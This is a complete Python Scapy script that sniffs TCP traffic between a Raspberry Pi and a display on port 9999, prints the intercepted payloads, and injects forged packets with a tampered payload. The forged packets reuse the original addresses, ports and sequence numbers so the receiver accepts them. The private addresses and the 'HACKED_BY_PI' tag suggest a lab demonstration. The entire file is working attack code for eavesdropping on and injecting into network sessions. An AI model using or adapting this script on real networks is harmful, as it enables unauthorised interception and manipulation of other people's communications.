#!/usr/bin/env python3
# sniffer_injector.py

from scapy.all import *

# Config
DISPLAY_IP = "192.168.165.16"
PI_IP = "192.168.165.15"
TARGET_PORT = 9999
INTERFACE = "eth1"
ATTACKER_MAC=get_if_hwaddr(INTERFACE)

def process_packet(pkt):
    if pkt.haslayer(Ether) and pkt[Ether].src == ATTACKER_MAC:
        return  # Bỏ qua gói do chính mình gửi
    
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ip_layer = pkt[IP]
        tcp_layer = pkt[TCP]

        if ip_layer.src == PI_IP and ip_layer.dst == DISPLAY_IP and tcp_layer.dport == TARGET_PORT:
            if pkt.haslayer(Raw):
                original_payload = pkt[Raw].load
                print(f"[+] Intercepted: {original_payload}")

                # Tạo gói mới có nội dung chỉnh sửa
                new_payload = original_payload + b" [HACKED_BY_PI]\n"

                forged_pkt = IP(src=ip_layer.src, dst=ip_layer.dst) / \
                             TCP(sport=tcp_layer.sport,
                                 dport=tcp_layer.dport,
                                 seq=tcp_layer.seq,
                                 ack=tcp_layer.ack,
                                 flags="PA") / \
                             Raw(load=new_payload)

                send(forged_pkt, verbose=False)
                print("[+] Injected modified packet.")

print(f"[*] Sniffing on {INTERFACE} for TCP {PI_IP} → {DISPLAY_IP}:{TARGET_PORT} ...")
sniff(iface=INTERFACE, filter=f"tcp and src host {PI_IP} and dst host {DISPLAY_IP} and dst port {TARGET_PORT}", prn=process_packet)
